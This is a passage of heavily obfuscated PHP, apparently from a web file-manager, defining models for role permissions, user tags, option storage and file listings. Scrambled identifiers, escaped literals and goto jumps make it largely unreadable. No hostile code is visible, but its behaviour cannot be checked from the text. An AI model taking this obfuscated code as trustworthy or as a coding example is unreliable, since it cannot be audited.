$Ÿ°‘ãö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ª£Ù°±Ó = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ÿ°‘ãö, $ª£Ù°±Ó); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ıßÛÓßÔ =& $_SERVER[Ş­ğŠìÒ]; $ıò¶éè· = parent::listData(); $Ë´šŞÕç = !1; foreach ($ıò¶éè· as $ÌÌŞ¤ü) { if ($ÌÌŞ¤ü[$ıßÛÓßÔ[487]] <= 0 || $ÌÌŞ¤ü[$ıßÛÓßÔ[1985]] == $ıßÛÓßÔ[228]) { continue; } if (!$Ë´šŞÕç) { $Ë´šŞÕç = $ÌÌŞ¤ü; continue; } if ($Ë´šŞÕç[$ıßÛÓßÔ[487]] > $ÌÌŞ¤ü[$ıßÛÓßÔ[487]]) { $Ë´šŞÕç = $ÌÌŞ¤ü; } } return $Ë´šŞÕç ? $Ë´šŞÕç[$ıßÛÓßÔ[475]] : $ıßÛÓßÔ[12]; } public function listData($ƒÔÔÕÜ˜ = false, $„‰ã«•› = "\163\x6f\x72\x74", $œ¼ó’÷š = false) { return parent::listData($ƒÔÔÕÜ˜, $„‰ã«•›, $œ¼ó’÷š); } public function update($ûã…¡Ï, $ğ”—Ë‹ä) { $µ¯ĞõŸ± =& $_SERVER[Ş­ğŠìÒ]; $ÇÆ’›Æ÷ = parent::listData($ûã…¡Ï); $Éâ÷¦£ = $this->findByName($ğ”—Ë‹ä[$µ¯ĞõŸ±[32]]); if (!$ÇÆ’›Æ÷ || $Éâ÷¦£ && $Éâ÷¦£[$µ¯ĞõŸ±[475]] != $ÇÆ’›Æ÷[$µ¯ĞõŸ±[475]]) { return !1; } $this->filterAuth($ğ”—Ë‹ä[$µ¯ĞõŸ±[487]]); return parent::update($ûã…¡Ï, $ğ”—Ë‹ä); } public function remove($÷Åø²å) { $ÉúÆ‚ø = parent::listData($÷Åø²å); if (!$ÉúÆ‚ø || $ÉúÆ‚ø[$_SERVER[Ş­ğŠìÒ][191]]) { return !1; } return parent::remove($÷Åø²å); } public function add($´ÇÛÛı = array()) { $ıìıèĞ˜ =& $_SERVER[Ş­ğŠìÒ]; if ($this->findByName($´ÇÛÛı[$ıìıèĞ˜[32]])) { return !1; } $âÅ±Á¦â = array($ıìıèĞ˜[32] => $ıìıèĞ˜[12], $ıìıèĞ˜[487] => 1, $ıìıèĞ˜[1986] => $ıìıèĞ˜[1973], $ıìıèĞ˜[1985] => 1, $ıìıèĞ˜[191] => 0, $ıìıèĞ˜[1987] => 0); $´ÇÛÛı = array_merge($âÅ±Á¦â, $´ÇÛÛı); $´ÇÛÛı[$ıìıèĞ˜[1987]] = $this->getSort(); $this->filterAuth($´ÇÛÛı[$ıìıèĞ˜[487]]); return parent::insert($´ÇÛÛı); } private function getSort() { $½ˆÍÚÜ° =& $_SERVER[Ş­ğŠìÒ]; $ÖêÃ¯ÑÓ = parent::listData(); $çşÂÔª = array_to_keyvalue($ÖêÃ¯ÑÓ, $½ˆÍÚÜ°[12], $½ˆÍÚÜ°[1987]); return empty($çşÂÔª) ? 0 : max($çşÂÔª) + 1; } private function filterAuth(&$ÕêˆÇ Å) { if (!$ÕêˆÇ Å) { return; } $×Õ€ù©Ã = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $—õ¤ç• = array(); foreach ($×Õ€ù©Ã as $†šèŒÎ) { if ($ÕêˆÇ Å & $†šèŒÎ) { $—õ¤ç•[] = $†šèŒÎ; } } if (in_array(self::AUTH_ROOT, $—õ¤ç•)) { $ÕêˆÇ Å = array_sum($×Õ€ù©Ã); return; } $ÙÖ„»Ÿ¡ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($—õ¤ç• as $†šèŒÎ) { if (isset($ÙÖ„»Ÿ¡[$†šèŒÎ])) { $—õ¤ç• = array_merge($—õ¤ç•, $ÙÖ„»Ÿ¡[$†šèŒÎ]); } } $—õ¤ç•[] = self::AUTH_SHOW; $ÕêˆÇ Å = array_sum(array_unique($—õ¤ç•)); } public function sort($«‘›îå, $çä ×¿Õ) { return parent::update($«‘›îå, $çä ×¿Õ); } } goto Bß­ÕÂÉäİ; dÆèÉåğ³…: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\x74\141\147\x4c\151\163\164"; public $modelType = "\125\x73\145\162\117\x70\164\x69\x6f\156"; public $field = array("\156\141\x6d\145", "\163\x74\171\154\x65", "\163\x6f\x72\164"); public function listData($¡º«õ÷” = false, $›³ô²û» = "\x73\x6f\162\164", $¹¸Üõ  = false) { return parent::listData($¡º«õ÷”, $›³ô²û», $¹¸Üõ ); } public function remove($ÒÕÂ¾Ÿä) { return parent::remove($ÒÕÂ¾Ÿä); } public function add($Íùé¡“°, $Ì”ßÍÆ = "\x6c\141\x62\145\x6c\55\x67\x72\145\171\x2d\156\x6f\162\155\x61\x6c") { $¼êİÊôÛ =& $_SERVER[Ş­ğŠìÒ]; if ($this->findByName($Íùé¡“°)) { return !1; } $£¾‚Å¨× = array($¼êİÊôÛ[494] => $Íùé¡“°, $¼êİÊôÛ[558] => $Ì”ßÍÆ, $¼êİÊôÛ[1967] => $this->getSort($¼êİÊôÛ[335]) + 1); return parent::insert($£¾‚Å¨×); } public function update($îáîÇ›, $ñÅÚÊÁ·) { $ÃˆÈ„ùÍ =& $_SERVER[Ş­ğŠìÒ]; $£îäêêô = $this->listData($îáîÇ›); $½–•£¡ğ = $this->findByName($ñÅÚÊÁ·[$ÃˆÈ„ùÍ[32]]); if (!$£îäêêô || $½–•£¡ğ && $½–•£¡ğ[$ÃˆÈ„ùÍ[475]] != $£îäêêô[$ÃˆÈ„ùÍ[475]]) { return !1; } return parent::update($îáîÇ›, $ñÅÚÊÁ·); } public function moveTop($ÈÈ­¥Šö) { $²«¦ˆ”× =& $_SERVER[Ş­ğŠìÒ]; $‹Ìïã = parent::listData(); $‘Œ÷şá§ = $this->getSort($²«¦ˆ”×[334]); foreach ($‹Ìïã as &$¸‚ÈĞ¡) { if ($¸‚ÈĞ¡[$²«¦ˆ”×[475]] == $ÈÈ­¥Šö) { $¸‚ÈĞ¡[$²«¦ˆ”×[1987]] = $‘Œ÷şá§; continue; } $¸‚ÈĞ¡[$²«¦ˆ”×[1987]] += 1; } unset($¸‚ÈĞ¡); return parent::resetData($‹Ìïã); } public function moveBottom($Ì¬ßĞÛÕ) { $Ãô·À‡î =& $_SERVER[Ş­ğŠìÒ]; $é»§áÚ = $this->getSort($Ãô·À‡î[335]) + 1; return parent::update($Ì¬ßĞÛÕ, array($Ãô·À‡î[1987] => $é»§áÚ)); } public function resetSort($Şâµñáó) { $º‰¶Ëüº =& $_SERVER[Ş­ğŠìÒ]; $£«‡äÒ© = array(); $Şâµñáó = is_array($Şâµñáó) ? $Şâµñáó : array(); for ($ÑïçôáÀ = 0; $ÑïçôáÀ < count($Şâµñáó); $ÑïçôáÀ++) { $£«‡äÒ©[$Şâµñáó[$ÑïçôáÀ] . $º‰¶Ëüº[12]] = $ÑïçôáÀ + 1; } $Öš²ç ƒ = parent::listData(); foreach ($Öš²ç ƒ as &$ÜˆŞÉ¡ó) { $º¦‹öé¸ = $£«‡äÒ©[$ÜˆŞÉ¡ó[$º‰¶Ëüº[475]]]; $ÜˆŞÉ¡ó[$º‰¶Ëüº[1987]] = $º¦‹öé¸ ? $º¦‹öé¸ : $ÜˆŞÉ¡ó[$º‰¶Ëüº[1987]]; } unset($ÜˆŞÉ¡ó); return parent::resetData($Öš²ç ƒ); } private function getSort($Öâ±÷ş) { $Õ„½™˜‘ =& $_SERVER[Ş­ğŠìÒ]; $æ€“œÈô = parent::listData(); $è´ƒ÷å = array_to_keyvalue($æ€“œÈô, $Õ„½™˜‘[12], $Õ„½™˜‘[1987]); if (!$è´ƒ÷å) { $è´ƒ÷å = array(0); } $ì«ı¦ü = $Öâ±÷ş == $Õ„½™˜‘[335] ? max($è´ƒ÷å) : min($è´ƒ÷å); return intval($ì«ı¦ü); } } goto aÇÔÕÑÙ…¾; Fƒ…»±Ëò„: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\155\117\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($Ãç€À£ = false, $ü‹ÍşÑÆ = "\x6d\157\x64\151\146\x79\x54\x69\155\145", $·›¦†Œ = false) { $ÏİÄç‹¼ = Model($this->modelType)->get(!1, $this->optionType, !0); $Å÷»éôı = array_values($ÏİÄç‹¼); if ($Å÷»éôı && $Å÷»éôı[0] && !is_array($Å÷»éôı[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÏİÄç‹¼ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÏİÄç‹¼) { return $Ãç€À£ ? null : array(); } if (!$Ãç€À£) { $ÏİÄç‹¼ = array_filter(array_values($ÏİÄç‹¼)); return array_sort_by($ÏİÄç‹¼, $ü‹ÍşÑÆ, $·›¦†Œ); } return $ÏİÄç‹¼[$_SERVER[Ş­ğŠìÒ][472] . $Ãç€À£]; } public function insert($÷ç»ëÒ¶) { $ØÚ¹‰å =& $_SERVER[Ş­ğŠìÒ]; $÷ç»ëÒ¶ = array_field_key($÷ç»ëÒ¶, $this->field); $İÂ¥˜º = Model($this->modelType)->get($ØÚ¹‰å[473], $this->optionType . $ØÚ¹‰å[474]); $İÂ¥˜º = $İÂ¥˜º ? $İÂ¥˜º : 0; $÷ç»ëÒ¶[$ØÚ¹‰å[475]] = ++$İÂ¥˜º; $÷ç»ëÒ¶[$ØÚ¹‰å[231]] = time(); $÷ç»ëÒ¶[$ØÚ¹‰å[88]] = time(); Model($this->modelType)->set($ØÚ¹‰å[473], $İÂ¥˜º, $this->optionType . $ØÚ¹‰å[474]); Model($this->modelType)->set($ØÚ¹‰å[472] . $İÂ¥˜º, $÷ç»ëÒ¶, $this->optionType); return $İÂ¥˜º; } public function update($šìÚ—ö, $øØ®ƒº) { $Ûİ²«Åİ =& $_SERVER[Ş­ğŠìÒ]; $øØ®ƒº = array_field_key($øØ®ƒº, $this->field); $Ğ¯÷¼± = $this->listData($šìÚ—ö); if (!$Ğ¯÷¼± || !$šìÚ—ö) { return !1; } $øØ®ƒº = array_merge($Ğ¯÷¼±, $øØ®ƒº); $øØ®ƒº[$Ûİ²«Åİ[88]] = time(); return Model($this->modelType)->set($Ûİ²«Åİ[472] . $šìÚ—ö, $øØ®ƒº, $this->optionType); } public function remove($¥öÆçÓ) { if (!$¥öÆçÓ) { return !1; } return Model($this->modelType)->remove($_SERVER[Ş­ğŠìÒ][472] . $¥öÆçÓ, $this->optionType); } public function clear() { $ñ³…œ›ß =& $_SERVER[Ş­ğŠìÒ]; Model($this->modelType)->remove($ñ³…œ›ß[473], $this->optionType . $ñ³…œ›ß[474]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ºÏ¶âéÓ, $ßñ¦¡É) { if (!$ßñ¦¡É) { return !1; } $ğ‘à”ıÃ = $this->listData(); $ğ‘à”ıÃ = array_to_keyvalue($ğ‘à”ıÃ, $ºÏ¶âéÓ); return isset($ğ‘à”ıÃ[$ßñ¦¡É]) ? $ğ‘à”ıÃ[$ßñ¦¡É] : !1; } public function findByName($¬ò´´ˆÖ) { return $this->findByKey($_SERVER[Ş­ğŠìÒ][32], $¬ò´´ˆÖ); } protected function resetData($‡ğ”¦é¢) { $Ö‰ú²êÆ =& $_SERVER[Ş­ğŠìÒ]; $‡ğ”¦é¢ = is_array($‡ğ”¦é¢) ? $‡ğ”¦é¢ : array(); $ĞÚË”Å€ = array(); for ($»˜£È¸ = 0; $»˜£È¸ < count($‡ğ”¦é¢); $»˜£È¸++) { $ĞÚË”Å€[$Ö‰ú²êÆ[472] . $‡ğ”¦é¢[$»˜£È¸][$Ö‰ú²êÆ[475]]] = $‡ğ”¦é¢[$»˜£È¸]; } return Model($this->modelType)->set($ĞÚË”Å€, !1, $this->optionType); } private function getAutoName($Æ¯¨Œ¢õ) { $¯æÔ§¶Â = array_to_keyvalue($this->listData(), $_SERVER[Ş­ğŠìÒ][32]); if (!$¯æÔ§¶Â || !isset($¯æÔ§¶Â[$Æ¯¨Œ¢õ])) { return $Æ¯¨Œ¢õ; } for ($¿‡”¡æ = 1; $¿‡”¡æ < count($¯æÔ§¶Â); $¿‡”¡æ++) { $ø‡èí¨ = $Æ¯¨Œ¢õ . "\50{$¿‡”¡æ}\51"; if (!isset($¯æÔ§¶Â[$ø‡èí¨])) { return $ø‡èí¨; } } return $ø‡èí¨; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($À“ëòÁ = false, $ôº³‘Ã‹ = '', $ü¥Ş´üÙ = false) { $äšçÍìø =& $_SERVER[Ş­ğŠìÒ]; $×²ªù¥ø = $this->cacheGet($ôº³‘Ã‹); $Ïù»£Ù = $this->optionDefault($ôº³‘Ã‹); $Ïù»£Ù = is_array($Ïù»£Ù) ? $Ïù»£Ù : array(); if (is_array($×²ªù¥ø)) { $×²ªù¥ø = array_merge($Ïù»£Ù, $×²ªù¥ø); return $À“ëòÁ ? isset($×²ªù¥ø[$À“ëòÁ]) ? $×²ªù¥ø[$À“ëòÁ] : null : $×²ªù¥ø; } $«şŒ¼ÍÄ = $this->filterWhere(array($äšçÍìø[33] => $ôº³‘Ã‹)); $×²ªù¥ø = $this->where($«şŒ¼ÍÄ)->select(); $×²ªù¥ø = array_to_keyvalue($×²ªù¥ø, $äšçÍìø[97], $äšçÍìø[450]); foreach ($×²ªù¥ø as $ê×Âöãğ => $ıï¡Ôš) { if ($ü¥Ş´üÙ || in_array($ê×Âöãğ, $this->jsonField)) { $×²ªù¥ø[$ê×Âöãğ] = json_decode($ıï¡Ôš, !0); } } $this->cacheSet($ôº³‘Ã‹, $×²ªù¥ø); $×²ªù¥ø = array_merge($Ïù»£Ù, $×²ªù¥ø); return $À“ëòÁ ? $×²ªù¥ø[$À“ëòÁ] : $×²ªù¥ø; } public function set($¥÷å´Š, $§®ô¿÷ = false, $å¢˜Ö¶Œ = '') { $ŒÚØãéÀ =& $_SERVER[Ş­ğŠìÒ]; $this->cacheRemove($å¢˜Ö¶Œ); $ÔÑå÷„‰ = array(); $Ş£ñÔÙÜ = is_array($¥÷å´Š) ? $¥÷å´Š : array($¥÷å´Š => $§®ô¿÷); foreach ($Ş£ñÔÙÜ as $áš‚öÀ => $„ñÖóĞ) { if (is_array($„ñÖóĞ)) { $„ñÖóĞ = json_encode_force($„ñÖóĞ); } $this->checkLength($„ñÖóĞ, !1, $this->tableName . $ŒÚØãéÀ[4] . $¥÷å´Š); $„ñÖóĞ = self::textEncode($„ñÖóĞ); $Ş£ñÔÙÜ = array($ŒÚØãéÀ[33] => $å¢˜Ö¶Œ, $ŒÚØãéÀ[97] => $áš‚öÀ, $ŒÚØãéÀ[450] => $„ñÖóĞ); $ÔÑå÷„‰[] = $this->filterWhere($Ş£ñÔÙÜ); } if (!$ÔÑå÷„‰) { return !0; } $¤èÇ‹ş = $this->cacheKey($ŒÚØãéÀ[476]); CacheLock::lock($¤èÇ‹ş); $òã³ü¢ï = $this->addAll($ÔÑå÷„‰, array(), !0); CacheLock::unlock($¤èÇ‹ş); return $òã³ü¢ï; } protected function optionDefault($ÏŸó±¶æ = '') { return !1; } public function setDeep($ûÔ´øÉ, $€¢¡Â¾Ÿ = false, $Õü™¿„ï = '') { $¤ƒÊ¦¥ = explode($_SERVER[Ş­ğŠìÒ][10], $ûÔ´øÉ); $Ê®£éÏÁ = $this->get(); array_set_value($Ê®£éÏÁ, $ûÔ´øÉ, $€¢¡Â¾Ÿ); $this->set($¤ƒÊ¦¥[0], $Ê®£éÏÁ[$¤ƒÊ¦¥[0]], $Õü™¿„ï); } public function remove($á à«¿, $Ñ©õ‰«É = '') { $Ÿ¹–şäâ =& $_SERVER[Ş­ğŠìÒ]; $this->cacheRemove($Ñ©õ‰«É); $¹Œôİ» = $this->filterWhere(array($Ÿ¹–şäâ[97] => $á à«¿, $Ÿ¹–şäâ[33] => $Ñ©õ‰«É)); if (is_null($á à«¿)) { unset($¹Œôİ»[$Ÿ¹–şäâ[97]]); } return $this->where($¹Œôİ»)->delete(); } public function cacheSet($É”Çø©î, $Ùã„¹ = false) { return Cache::set($this->cacheKey($É”Çø©î), $Ùã„¹); } public function cacheGet($Àğè¦) { return Cache::get($this->cacheKey($Àğè¦)); } public function cacheRemove($³à†±áÏ) { return Cache::remove($this->cacheKey($³à†±áÏ)); } protected function filterWhere($êÂúûöó) { return $êÂúûöó; } protected function cacheKey($»Úµ‘Ò—) { return $»Úµ‘Ò—; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\x63\145"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\x6d\145" => "\x69\x6f\x5f\x73\157\165\162\143\145\137\x6d\145\x74\141", "\155\x65\x74\x61\106\151\145\154\x64" => "\163\157\165\162\x63\145\x49\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\156\163\x65\162\x74", "\x66\x75\x6e\143\164\151\157\x6e"), array("\143\x72\145\141\164\x65\124\151\x6d\145", "\164\151\155\x65", "\x69\156\163\145\x72\164", "\146\x75\156\143\164\151\x6f\156"), array("\166\x69\x65\167\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\145\162\164", "\146\165\x6e\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ààßÎ˜Ú) { return $this->listSource(array($_SERVER[Ş­ğŠìÒ][477] => $ààßÎ˜Ú)); } public function typeName($¦Ïğ‰ï) { static $üÕ‡‚ÀÍ = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\155", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $üÕ‡‚ÀÍ[$¦Ïğ‰ï . $_SERVER[Ş­ğŠìÒ][12]]; } public function sourceListInfo($÷ µ™…¶, $£Ñì¢¼Ä = false) { $Î‘¢„Ğø =& $_SERVER[Ş­ğŠìÒ]; $÷ µ™…¶ = $÷ µ™…¶ ? $÷ µ™…¶ : array(); $÷ µ™…¶ = array_filter(array_unique($÷ µ™…¶)); if (!$÷ µ™…¶) { return array(); } $éÊ²×«‰ = $this->where(array($Î‘¢„Ğø[193] => array($Î‘¢„Ğø[7], $÷ µ™…¶)))->select(); $this->_listDataApply($éÊ²×«‰, $£Ñì¢¼Ä); return array_to_keyvalue($éÊ²×«‰, $Î‘¢„Ğø[193]); } public function pathInfoFilter(&$–Àé³Ïê) { $¬€µÔ¤ =& $_SERVER[Ş­ğŠìÒ]; static $Èñ¿¾©¾ = false; static $İì—¥Š = false; static $ôÈ¾È¶Š = false; if (!$Èñ¿¾©¾) { $Ÿ®î˜Ö = $¬€µÔ¤[478]; $Ÿ®î˜Ö .= $¬€µÔ¤[479]; $Ÿ®î˜Ö .= $¬€µÔ¤[480]; $£®ÖÌö¦ = $¬€µÔ¤[481]; $É½Æ‚ÆÓ = explode($¬€µÔ¤[50], $£®ÖÌö¦); $Èñ¿¾©¾ = explode($¬€µÔ¤[50], $Ÿ®î˜Ö); $İì—¥Š = array(); foreach ($Èñ¿¾©¾ as $‡ôå¸×¥) { if (in_array($‡ôå¸×¥, $É½Æ‚ÆÓ)) { continue; } $İì—¥Š[] = $‡ôå¸×¥; } $ôÈ¾È¶Š = explode($¬€µÔ¤[50], $¬€µÔ¤[482]); } foreach ($ôÈ¾È¶Š as $ØÈÑİ­Ê) { if (isset($–Àé³Ïê[$ØÈÑİ­Ê])) { $–Àé³Ïê[$ØÈÑİ­Ê] = intval($–Àé³Ïê[$ØÈÑİ­Ê]); } } $–Àé³Ïê[$¬€µÔ¤[87]] = $¬€µÔ¤[483] . $–Àé³Ïê[$¬€µÔ¤[193]] . $¬€µÔ¤[484]; $–Àé³Ïê[$¬€µÔ¤[33]] = $–Àé³Ïê[$¬€µÔ¤[485]] == 1 ? $¬€µÔ¤[78] : $¬€µÔ¤[230]; $–Àé³Ïê[$¬€µÔ¤[190]] = $this->typeName($–Àé³Ïê[$¬€µÔ¤[190]]); if ($–Àé³Ïê[$¬€µÔ¤[485]] != 1) { $–Àé³Ïê[$¬€µÔ¤[169]] = $–Àé³Ïê[$¬€µÔ¤[486]]; unset($–Àé³Ïê[$¬€µÔ¤[486]]); } $»®…·¼ = $Èñ¿¾©¾; if (isset($–Àé³Ïê[$¬€µÔ¤[487]]) && $–Àé³Ïê[$¬€µÔ¤[487]][$¬€µÔ¤[488]] == -1) { $»®…·¼ = $İì—¥Š; } $–Àé³Ïê = array_field_key($–Àé³Ïê, $»®…·¼); return $–Àé³Ïê; } public function listUserFav() { $Ÿ²œİé› =& $_SERVER[Ş­ğŠìÒ]; $Ñû¥³úó = Model($Ÿ²œİé›[489])->listData(); $ı„ëîÏ = array_filter_by_field($Ñû¥³úó, $Ÿ²œİé›[33], $Ÿ²œİé›[490]); $ı„ëîÏ = array_to_keyvalue($ı„ëîÏ, $Ÿ²œİé›[12], $Ÿ²œİé›[87]); if ($ı„ëîÏ) { $ß¸•êÃÊ = $this->listSource(array($Ÿ²œİé›[491] => array($Ÿ²œİé›[492], $ı„ëîÏ))); } $ß¸•êÃÊ = array_to_keyvalue($ß¸•êÃÊ[$Ÿ²œİé›[445]], $Ÿ²œİé›[193]); foreach ($Ñû¥³úó as &$†ıÕä…¢) { $†ıÕä…¢ = array($Ÿ²œİé›[493] => $†ıÕä…¢[$Ÿ²œİé›[475]], $Ÿ²œİé›[494] => $†ıÕä…¢[$Ÿ²œİé›[32]], $Ÿ²œİé›[495] => $†ıÕä…¢[$Ÿ²œİé›[87]], $Ÿ²œİé›[496] => $†ıÕä…¢[$Ÿ²œİé›[33]], $Ÿ²œİé›[497] => $†ıÕä…¢[$Ÿ²œİé›[231]], $Ÿ²œİé›[498] => $†ıÕä…¢[$Ÿ²œİé›[88]]); if ($†ıÕä…¢[$Ÿ²œİé›[33]] == $Ÿ²œİé›[490] && $ß¸•êÃÊ[$†ıÕä…¢[$Ÿ²œİé›[87]]]) { $†ıÕä…¢[$Ÿ²œİé›[90]] = $ß¸•êÃÊ[$†ıÕä…¢[$Ÿ²œİé›[87]]]; } } unset($†ıÕä…¢); return $Ñû¥³úó; } public function listUserTag($‹×Îùê¥) { $€³ŸİıÅ =& $_SERVER[Ş­ğŠìÒ]; if ($‹×Îùê¥ && !is_array($‹×Îùê¥)) { $‹×Îùê¥ = array($‹×Îùê¥); } $™¼ËÚ›å = Model($€³ŸİıÅ[499])->listData(); $±Ó­ë¡÷ = array(); $à…Èõä² = array(); foreach ($™¼ËÚ›å as $î¶ÂÃŞÖ) { $ì¦€å¢ = $î¶ÂÃŞÖ[$€³ŸİıÅ[87]]; if (!$ì¦€å¢) { continue; } if (!isset($à…Èõä²[$ì¦€å¢])) { $à…Èõä²[$ì¦€å¢] = array(); } $à…Èõä²[$ì¦€å¢][] = $î¶ÂÃŞÖ[$€³ŸİıÅ[500]]; $±Ó­ë¡÷[$î¶ÂÃŞÖ[$€³ŸİıÅ[87]]] = $î¶ÂÃŞÖ; } $»ÜüÚ·ë = array(); $Û²¶œç¶ = array(); $éÌÒ¿ÊÒ = array(); foreach ($à…Èõä² as $ÖùşÛÑ’ => $èÆµáêÈ) { $µåì­¡ˆ = !0; if (!$‹×Îùê¥) { $»ÜüÚ·ë[] = $ÖùşÛÑ’; continue; } foreach ($‹×Îùê¥ as $£°…šï) { if (!in_array($£°…šï, $èÆµáêÈ)) { $µåì­¡ˆ = !1; break; } } if (!$µåì­¡ˆ) { continue; } if (!is_numeric($ÖùşÛÑ’)) { $ÔÖâ²ğ = $±Ó­ë¡÷[$ÖùşÛÑ’]; $‡²âıá = array($€³ŸİıÅ[32] => $ÔÖâ²ğ[$€³ŸİıÅ[32]], $€³ŸİıÅ[87] => $ÔÖâ²ğ[$€³ŸİıÅ[87]], $€³ŸİıÅ[33] => $ÔÖâ²ğ[$€³ŸİıÅ[33]], $€³ŸİıÅ[90] => array($€³ŸİıÅ[501] => 1), $€³ŸİıÅ[232] => !0); if ($ÔÖâ²ğ[$€³ŸİıÅ[33]] == $€³ŸİıÅ[230]) { $éÌÒ¿ÊÒ[] = $‡²âıá; } if ($ÔÖâ²ğ[$€³ŸİıÅ[33]] == $€³ŸİıÅ[78]) { $Û²¶œç¶[] = $‡²âıá; } continue; } $»ÜüÚ·ë[] = $ÖùşÛÑ’; } if ($»ÜüÚ·ë) { $ÎüÌÑé‰ = $this->listSource(array($€³ŸİıÅ[491] => array($€³ŸİıÅ[492], $»ÜüÚ·ë))); } $ÎüÌÑé‰ = $ÎüÌÑé‰ ? $ÎüÌÑé‰ : array($€³ŸİıÅ[85] => array(), $€³ŸİıÅ[86] => array()); $ÎüÌÑé‰[$€³ŸİıÅ[85]] = array_merge($ÎüÌÑé‰[$€³ŸİıÅ[85]], $Û²¶œç¶); $ÎüÌÑé‰[$€³ŸİıÅ[86]] = array_merge($ÎüÌÑé‰[$€³ŸİıÅ[86]], $éÌÒ¿ÊÒ); if (isset($ÎüÌÑé‰[$€³ŸİıÅ[442]]) && count($»ÜüÚ·ë) == $ÎüÌÑé‰[$€³ŸİıÅ[442]][$€³ŸİıÅ[443]]) { return $ÎüÌÑé‰; } $ª‹¿ç‘ = array(); $ŞÚœ‰™ = array_to_keyvalue($ÎüÌÑé‰[$€³ŸİıÅ[85]], $€³ŸİıÅ[12], $€³ŸİıÅ[193]); $Âö§ä = array_to_keyvalue($ÎüÌÑé‰[$€³ŸİıÅ[86]], $€³ŸİıÅ[12], $€³ŸİıÅ[193]); $Ã¾´…ù® = array_merge($Âö§ä, $ŞÚœ‰™); foreach ($»ÜüÚ·ë as $ì¦€å¢) { if (!in_array($ì¦€å¢, $Ã¾´…ù®)) { $ª‹¿ç‘[] = $ì¦€å¢; } } if ($ª‹¿ç‘) { Model($€³ŸİıÅ[502])->removeBySource($ª‹¿ç‘); } return $ÎüÌÑé‰; } public function listUserRecycle() { $à›¸¹÷ú =& $_SERVER[Ş­ğŠìÒ]; $Ì×ëöõÔ = Model($à›¸¹÷ú[503])->listData(); if (!$Ì×ëöõÔ) { return array(); } $»—’œˆĞ = array($à›¸¹÷ú[491] => array($à›¸¹÷ú[492], $Ì×ëöõÔ), $à›¸¹÷ú[504] => 1); return $this->listSource($»—’œˆĞ); } public function listSource($´•Üò™ü, $ï§Ì¹Í = 3000, $ËŸ©İ• = false) { $¶ğàİÜ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($´•Üò™ü[$¶ğàİÜ[505]])) { $´•Üò™ü[$¶ğàİÜ[505]] = 0; } if (isset($´•Üò™ü[$¶ğàİÜ[192]]) && $´•Üò™ü[$¶ğàİÜ[192]] == $¶ğàİÜ[228]) { $´•Üò™ü[$¶ğàİÜ[486]] = array($¶ğàİÜ[407], $¶ğàİÜ[506]); } $´äğÅ”Ã = $¶ğàİÜ[507]; $½ÔºŞ‡ = $this->field($´äğÅ”Ã)->_makeOrder()->where($´•Üò™ü)->selectPage($ï§Ì¹Í); $this->_listPageCheck($½ÔºŞ‡, $´äğÅ”Ã, $´•Üò™ü); $this->_listDataApply($½ÔºŞ‡[$¶ğàİÜ[445]], $ËŸ©İ•); $this->_listMake($½ÔºŞ‡); return $½ÔºŞ‡; } private function _listPageCheck(&$Öêğù²¡, $–ıÂˆ‹Õ, $ìÙÃçÕí) { $èÂüŞÕã =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($Öêğù²¡[$èÂüŞÕã[442]])) { return; } $Ì•¢‹é = $Öêğù²¡[$èÂüŞÕã[442]]; if ($Ì•¢‹é[$èÂüŞÕã[444]] <= 1) { return; } if ($Ì•¢‹é[$èÂüŞÕã[443]] >= 100000) { return; } if (Model($èÂüŞÕã[508])->get($èÂüŞÕã[509]) != $èÂüŞÕã[510]) { return; } $–ıÂˆ‹Õ = str_replace(array($èÂüŞÕã[53], $èÂüŞÕã[418], $èÂüŞÕã[262]), $èÂüŞÕã[12], $–ıÂˆ‹Õ); $–ıÂˆ‹Õ = $èÂüŞÕã[511] . str_replace($èÂüŞÕã[50], $èÂüŞÕã[512], $–ıÂˆ‹Õ) . $èÂüŞÕã[513]; $³Ğïñî = $èÂüŞÕã[514]; $³Ğïñî = $³Ğïñî . $èÂüŞÕã[515]; $˜¸½¬­ = $Ì•¢‹é[$èÂüŞÕã[439]] * ($Ì•¢‹é[$èÂüŞÕã[429]] - 1) . $èÂüŞÕã[50] . $Ì•¢‹é[$èÂüŞÕã[439]]; $±Şé£ßÀ = $this->_makeOrder(!0); $²ôÛ…¸× = $èÂüŞÕã[511] . str_replace($èÂüŞÕã[50], $èÂüŞÕã[512], $±Şé£ßÀ[0]); if (strpos($²ôÛ…¸×, $èÂüŞÕã[516])) { $²ôÛ…¸× = str_replace($èÂüŞÕã[516], $èÂüŞÕã[517], $²ôÛ…¸×); } else 